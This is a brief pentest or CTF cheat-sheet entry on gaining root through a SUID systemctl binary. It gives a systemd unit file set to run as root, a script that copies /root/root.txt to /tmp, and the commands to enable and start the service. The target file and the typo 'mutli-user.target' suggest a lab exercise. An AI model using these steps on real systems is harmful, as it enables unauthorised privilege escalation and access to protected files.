# systemctl

> Introspect and control the state of the `systemd` system and service manager.

---

## Exploit [[suid]] `systemctl`

### Define the service (i.e., `/dev/shm/tgihf.service`)

```
[Unit]
description=tgihf

[Service]
Type=simple
User=root
ExecStart=/dev/shm/tgihf.sh

[Install]
WantedBy=mutli-user.target
```

### Write the script to execute with elevated privileges (i.e., `/dev/shm/tgihf.sh`)

```bash
#!/bin/bash
cat /root/root.txt > /tmp/root.txt
```

Ensure that it is executable! `chmod +x /dev/shm/tgihf.sh`

### Enable the service

```bash
systemctl enable /dev/shm/tgihf.service
```

### Start the service

```bash
systemctl start tgihf
```